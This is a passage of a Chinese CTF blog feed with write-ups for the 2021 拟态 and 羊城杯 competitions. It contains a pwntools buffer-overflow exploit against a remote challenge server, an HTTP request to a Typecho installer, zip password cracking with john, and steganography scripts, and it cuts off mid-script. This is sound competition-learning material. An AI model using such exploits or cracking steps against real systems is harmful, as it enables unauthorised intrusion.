class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://121.36.229.59:32767/install.php?config</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>__typecho_lang=zh_CN</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure><p><img src="/img/2021nitai/image-20211026002529336.png" class="lazyload" data-srcset="/img/2021nitai/image-20211026002529336.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211026002529336"></p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="0x1-sonic"><a href="#0x1-sonic" class="headerlink" title="0x1 sonic"></a>0x1 sonic</h3><p> <a href="#">@小火车</a></p><p>ida查看gets函数存在栈溢出，将输入的登录名溢出到RSP<br>通过ida查看不用登录的地址偏移在0x73a</p><p><img src="/img/2021nitai/image-20211026002644504.png" class="lazyload" data-srcset="/img/2021nitai/image-20211026002644504.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211026002644504"></p><p>通过python直接获取远程服务器main地址为0x00005555555547cf</p><p><img src="/img/2021nitai/image-20211026002700136.png" class="lazyload" data-srcset="/img/2021nitai/image-20211026002700136.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211026002700136"></p><p>用patternLocOffset.py计算得到偏移量为40</p><p><img src="/img/2021nitai/image-20211026002718009.png" class="lazyload" data-srcset="/img/2021nitai/image-20211026002718009.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211026002718009"></p><p><img src="/img/2021nitai/image-20211026002728052.png" class="lazyload" data-srcset="/img/2021nitai/image-20211026002728052.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211026002728052"></p><p><img src="/img/2021nitai/image-20211026002742536.png" class="lazyload" data-srcset="/img/2021nitai/image-20211026002742536.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211026002742536"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">sh = remote(<span class="string">&#x27;123.60.63.90&#x27;</span>,<span class="number">6888</span>)</span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span>*<span class="number">40</span>+p64(<span class="number">0x000055555555473a</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;login:&#x27;</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="0x1-拟态签到题"><a href="#0x1-拟态签到题" class="headerlink" title="0x1 拟态签到题"></a>0x1 拟态签到题</h3><p>解压压缩包，flag.txt base64解码得到<br>flag{GaqY7KtEtrVIX1Q5oP5iEBRCYXEAy8rT}</p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><p>每个题都只做了前面一点，后面不太会，<a href="https://www.yuque.com/vbpnt">@LI</a> 大佬NB~</p><h3 id="0x1-WeirdPhoto"><a href="#0x1-WeirdPhoto" class="headerlink" title="0x1 WeirdPhoto"></a>0x1 WeirdPhoto</h3><p><a href="https://www.yuque.com/vbpnt">@LI</a> <a href="https://tari.moe/">@tari</a></p><p>一开始1.png 不知道是啥…，突然发现win下是可以打开看的，经典的高度或者宽度被修改了，通过png crc计算出图片原来的宽高</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打开图片</span></span><br><span class="line">crcbp = <span class="built_in">open</span>(<span class="string">&quot;/Users/tari/Downloads/1.png&quot;</span>, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line"><span class="comment"># 假设原图片大小在 2000x2000以内</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2000</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2000</span>):</span><br><span class="line">        data = crcbp[<span class="number">12</span>:<span class="number">16</span>] + \</span><br><span class="line">               struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, i) + struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, j) + crcbp[<span class="number">24</span>:<span class="number">29</span>]</span><br><span class="line">        crc32 = binascii.crc32(data) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="comment"># 图片当前CRC, 即 0x9e916964 为 CRC, 对应16进制编辑器里 00000010h d-f 和 00000020h 0</span></span><br><span class="line">        <span class="keyword">if</span> (crc32 == <span class="number">0x9e916964</span>):</span><br><span class="line">            <span class="built_in">print</span>(i, j)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;hex:&#x27;</span>, <span class="built_in">hex</span>(i), <span class="built_in">hex</span>(j))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/img/2021nitai/image-20211026002900343.png" class="lazyload" data-srcset="/img/2021nitai/image-20211026002900343.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211026002900343"></p><p>输入右边的英文 TIEWOFTHSAEOUIITNRBCOSHSTSAN 密码不对</p><p>解出压缩包密码：THISISTHEANSWERTOOBSFUCATION</p><p><img src="/img/2021nitai/image-20211026002915843.png" class="lazyload" data-srcset="/img/2021nitai/image-20211026002915843.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211026002915843"></p><p>里面一堆图片，但直接把 <code>out </code> 丢进16进制编辑器可以看到一堆 obj，所以猜    是个PDF，修复一下文件头</p><p><img src="/img/2021nitai/image-20211026003007224.png" class="lazyload" data-srcset="/img/2021nitai/image-20211026003007224.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211026003007224"></p><p>搜一下 PDF 隐写，发现很多都是用的 wbStego4，下个wbStego4，默认选项解密，然后保存输出为txt，就能得到flag</p><p><img src="/img/2021nitai/image-20211026003050096.png" class="lazyload" data-srcset="/img/2021nitai/image-20211026003050096.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211026003050096"></p><h3 id="0x2-bar"><a href="#0x2-bar" class="headerlink" title="0x2 bar"></a>0x2 bar</h3><p><a href="https://www.yuque.com/vbpnt">@LI</a>  <a href="">@小火车</a> <a href="https://tari.moe/">@tari</a></p><p>官方提示：</p><ol><li><p>观察得到字符串在code93在线网站生成的条形码停止字符的前两位字符 </p></li><li><p>flag内容都是小写英文字母</p></li></ol><p>根据题目名称，得知是一个条形码，然后把 GIF每一帧拼接一下即可，网上找个脚本魔改了一下</p><p><a href="https://blog.csdn.net/Cony_14/article/details/102730294">https://blog.csdn.net/Cony_14/article/details/102730294</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="comment"># 工作目录, 会在该目录生成大量临时文件, 尽量新建文件夹运行哈</span></span><br><span class="line">FILE_ROOT = <span class="string">&#x27;/Users/tari/Downloads/gif&#x27;</span></span><br><span class="line"><span class="comment"># 待处理图片</span></span><br><span class="line">GIT_PATH = os.path.join(FILE_ROOT, <span class="string">&#x27;output.gif&#x27;</span>)</span><br><span class="line"><span class="comment"># GIF每张图片宽度</span></span><br><span class="line">IMAGE_WIDTH = <span class="number">20</span></span><br><span class="line"><span class="comment"># GIF每张图片高度</span></span><br><span class="line">IMAGE_HEIGHT = <span class="number">100</span></span><br><span class="line"><span class="comment"># 最终输出图片高度, 如果过长可以稍微调节下, 一般 100 足够了</span></span><br><span class="line">TARGET_HEIGHT = <span class="number">100</span></span><br><span class="line"><span class="comment"># 输出图片名称</span></span><br><span class="line">OUTPUT_IMAGE = <span class="string">&#x27;new_im.png&#x27;</span></span><br><span class="line"></span><br><span class="line">im = Image.<span class="built_in">open</span>(GIT_PATH)</span><br><span class="line"><span class="comment"># 打开一个序列文件时，PIL库自动加载第一帧, 保存第一帧到当前目录下</span></span><br><span class="line">im.save(os.path.join(FILE_ROOT, <span class="built_in">str</span>(im.tell()) + <span class="string">&#x27;.png&#x27;</span>))</span><br><span class="line"><span class="comment"># 计数有多少帧</span></span><br><span class="line">image_cnt = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="comment"># 向下一帧移动</span></span><br><span class="line">        im.seek(im.tell() + <span class="number">1</span>)</span><br><span class="line">        <span class="comment"># 保存下一帧</span></span><br><span class="line">        im.save(os.path.join(FILE_ROOT, <span class="built_in">str</span>(im.tell()) + <span class="string">&#x27;.png&#x27;</span>))</span><br><span class="line">        image_cnt += <span class="number">1</span></span><br><span class="line"><span class="keyword">except</span> EOFError:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建宽度为image_cnt*IMAGE_WIDTH，高度为100的空白新照片</span></span><br><span class="line">new_im = Image.new(<span class="string">&#x27;RGBA&#x27;</span>, (IMAGE_WIDTH * image_cnt, IMAGE_HEIGHT))</span><br><span class="line">im_list = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, image_cnt):</span><br><span class="line">    im_list.append(Image.<span class="built_in">open</span>(os.path.join(FILE_ROOT, <span class="built_in">str</span>(i) + <span class="string">&#x27;.png&#x27;</span>)))</span><br><span class="line"></span><br><span class="line">width = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> im <span class="keyword">in</span> im_list:</span><br><span class="line">    <span class="comment"># 将各个图片对象im粘贴到新图片上，图片的左上角和右下角坐标分别为width,IMAGE_WIDTH,width+IMAGE_WIDTH,IMAGE_HEIGHT</span></span><br><span class="line">    new_im.paste(im, (width, <span class="number">0</span>, width + IMAGE_WIDTH, IMAGE_HEIGHT))</span><br><span class="line">    width = width + IMAGE_WIDTH</span><br><span class="line"><span class="comment"># 宽度不变, 必要时填充高度</span></span><br><span class="line">new_im = new_im.resize((width, TARGET_HEIGHT))</span><br><span class="line"><span class="comment"># 保存成新文件</span></span><br><span class="line">new_im.save(os.path.join(FILE_ROOT, OUTPUT_IMAGE))</span><br><span class="line">new_im.show()</span><br></pre></td></tr></table></figure><p>这条形码怪怪的感觉</p><p><img src="/img/2021nitai/new_im.png" class="lazyload" data-srcset="/img/2021nitai/new_im.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="new_im"></p><p>然后发现参考资料：</p><p>[<a href="http://www.appsbarcode.com/Code%2093.php]">http://www.appsbarcode.com/Code%2093.php]</a>(<a href="http://www.appsbarcode.com/Code">http://www.appsbarcode.com/Code</a> 93.php)</p><p><img src="/img/2021nitai/image-20211026003505580.png" class="lazyload" data-srcset="/img/2021nitai/image-20211026003505580.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211026003505580"></p><p>START是111141，用PS自动生成参考线，把每9位都写出来。可以看到，前面虽然存在一些不是黑白的颜色，但是发现后面也有START标志，不会被前面影响。</p><p><img src="/img/2021nitai/image-20211026003537600.png" class="lazyload" data-srcset="/img/2021nitai/image-20211026003537600.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211026003537600"></p><p>前面30个字符就可以整理出来了，是：<code>F0C62DB973684DBDA896F9C5F6D962</code></p><p>还差两个字符，提示是停止符号的前两个，也就是上面那个check digit</p><p>这里可以直接生成一个新的条形码，然后得到两个检查位</p><p><img src="/img/2021nitai/image-20211026003613203.png" class="lazyload" data-srcset="/img/2021nitai/image-20211026003613203.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211026003613203"></p><p>对照表格，分别是<code>W</code>和<code>space</code></p><p><img src="/img/2021nitai/image-20211026003637492.png" class="lazyload" data-srcset="/img/2021nitai/image-20211026003637492.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211026003637492"></p><p>组合起来就是，<code>F0C62DB973684DBDA896F9C5F6D962W[space]</code></p><p>整理卡了半天。。。后面跑去问是不是题目错了。。</p><p>得到的答复是</p><blockquote><p>小写生成的条码是没有w和空格的</p></blockquote><p>条形码解出来的不是全大写的嘛，标准就是呀</p><p>也就是说不是用 <code>F0C62DB973684DBDA896F9C5F6D962</code> 去生成条形码，而是用小写 <code>f0c62db973684dbda896f9c5f6d962</code> 去生成</p><p><a href="http://barcode.cnaidc.com/html/BCGcode93.php">http://barcode.cnaidc.com/html/BCGcode93.php</a></p><p><img src="/img/2021nitai/image-20211026004150616.png" class="lazyload" data-srcset="/img/2021nitai/image-20211026004150616.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211026004150616"></p><p>算了一下发现两个检查位分别是 221121(U) 和  111222(M)</p><p>最终flag <code>flag&#123;f0c62db973684dbda896f9c5f6d962um&#125;</code></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> ctf比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> ctf比赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021羊城杯部分 Writeup</title>
      <link href="//p/2021/2021ycb/"/>
      <url>//p/2021/2021ycb/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p>和几个**”社会”**人士（<a href="https://www.cnblogs.com/DEADF1SH-CAT/">@DEADF1SH-CAT</a>、 <a href="#">@Oah</a>、 <a href="#">@小火车</a>）一起组队参加了这次比赛，终于不用在高校组卷了，哈哈</p><p>部分题目下载链接：</p><ul><li><a href="/static/2021/09/12/2021ycb-misc.7z">2021ycb-misc.7z</a></li><li><a href="/static/2021/09/12/2021ycb-web.7z">2021ycb-web.7z</a></li><li><a href="/static/2021/09/12/2021ycb-crypto.7z">2021ycb-crypto.7z</a></li></ul><p>9.17更：官方WP：<a href="https://mp.weixin.qq.com/s/BqLTX3au1GIPn3cz9xZISA">https://mp.weixin.qq.com/s/BqLTX3au1GIPn3cz9xZISA</a></p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="0x01-签到题"><a href="#0x01-签到题" class="headerlink" title="0x01 签到题"></a>0x01 签到题</h3><p>不想吐槽，一起来看流星雨对应数字17。。队伍里师傅太骚，我是没想到 2333</p><p>gif图每一帧都对应一个数字</p><p>28定律-8卦-30而立-北斗7星-4才子-歼20-2只黄鹂-17来看流星雨-乔丹球服23-1马当先-12星座-新闻联播19点开播放</p><p>所以是 md5(28-08-30-07-04-20-02-17-23-01-12-19)</p><p>Sangfor{d93b7da38d89c19f481e710ef1b3558b}</p><h3 id="0x05-Misc520"><a href="#0x05-Misc520" class="headerlink" title="0x05 Misc520"></a>0x05 Misc520</h3><blockquote><p>题目简介：有一天，zip爱上了pcap，zip为了能与pcap创造更多机会，不断地将自己的能力表现出来。可是，LSBSteg却突然杀了出来，将pcap吞并于png中，不放出来。zip看到了png，多喝热水少做梦。zip异常的愤怒，不断地用自己的能力去报复png，不让png逃走。至今，zip仍未释怀。。。</p></blockquote><p>1、首先解压缩520次，顺便打印文件内容（一开始没发现，后面做出来后试了n个组合都不对…），并得到一张图片<code>flag.png</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"></span><br><span class="line">ROOT_DIR = <span class="string">&#x27;/Users/tari/Downloads/rezip/&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unzip</span>(<span class="params">file_name</span>):</span></span><br><span class="line">    f = zipfile.ZipFile(file_name, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> file <span class="keyword">in</span> f.namelist():</span><br><span class="line">        f.extract(file, ROOT_DIR)</span><br><span class="line">        <span class="keyword">if</span> file.startswith(<span class="string">&#x27;story&#x27;</span>):</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(ROOT_DIR + file, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> fr:</span><br><span class="line">                <span class="built_in">print</span>(fr.read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">520</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    name = ROOT_DIR + <span class="built_in">str</span>(i) + <span class="string">&#x27;.zip&#x27;</span></span><br><span class="line">    unzip(name)</span><br></pre></td></tr></table></figure><p>顺便在150.zip 压缩包的 story文件的发现</p><p><img src="/img/2021ycb/image-20210912210058625.png" class="lazyload" data-srcset="/img/2021ycb/image-20210912210058625.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210912210058625"></p><p>2、获取到图片后通过zsteg提取flag.pcap</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zsteg flag.png</span><br></pre></td></tr></table></figure><p><img src="/img/2021ycb/image-20210912210106395.png" class="lazyload" data-srcset="/img/2021ycb/image-20210912210106395.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210912210106395"></p><p>3、发现里面还有个压缩包，一开始还以为提取错了… </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steg flag.png -e b1,bgr,lsb,xy &gt; flag.zip</span><br></pre></td></tr></table></figure><p><img src="/img/2021ycb/image-20210912210144687.png" class="lazyload" data-srcset="/img/2021ycb/image-20210912210144687.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210912210144687"></p><p>4、压缩包有密码，这个安利 john，很快</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zip2john 8.zip &gt; passwd.hash</span><br><span class="line">john passwd.hash</span><br></pre></td></tr></table></figure><p><img src="/img/2021ycb/image-20210912210321612.png" class="lazyload" data-srcset="/img/2021ycb/image-20210912210321612.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210912210321612"></p><p><img src="/img/2021ycb/image-20210912210323805.png" class="lazyload" data-srcset="/img/2021ycb/image-20210912210323805.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210912210323805"></p><p>5、打开压缩包发现是USB流量，通过<a href="https://www.cnblogs.com/hackxf/p/10670844.html">USB流量分析文章</a>，得知获取鼠标数据方式</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark -r flag.pcap -T fields -e usb.capdata &gt; usbdata.txt</span><br></pre></td></tr></table></figure><p>6、将usbdata.txt通过以下脚本，运行 <code>python xxx.py &gt; usb.txt</code>  输出得到鼠标的坐标点</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">nums = []</span><br><span class="line">keys = <span class="built_in">open</span>(<span class="string">&quot;usbdata.txt&quot;</span>, <span 